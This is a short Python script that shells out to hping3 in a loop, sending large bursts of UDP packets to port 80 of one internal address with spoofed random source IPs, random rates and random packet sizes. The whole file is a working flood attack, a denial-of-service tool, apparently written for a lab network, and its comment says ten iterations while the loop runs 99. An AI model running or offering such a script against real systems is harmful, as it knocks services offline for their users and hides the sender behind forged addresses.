import random;
import os;


# 10 times udp attack
for i in range(1, 100):
    ip = random.randint(1, 250)
    pktCnt = random.randint(100000, 150000)
    realIp = "192.168.1." + str(ip)
    rate = 10 ** random.randint(1, 2)
    size = random.randint(64, 150)
    cmd = "hping3 -c " + str(pktCnt) + " -2 -p 80 -a " + realIp + " 192.168.11.20 -i u" + str(rate) + " -d " + str(size)
    os.system(cmd)
    print(cmd)


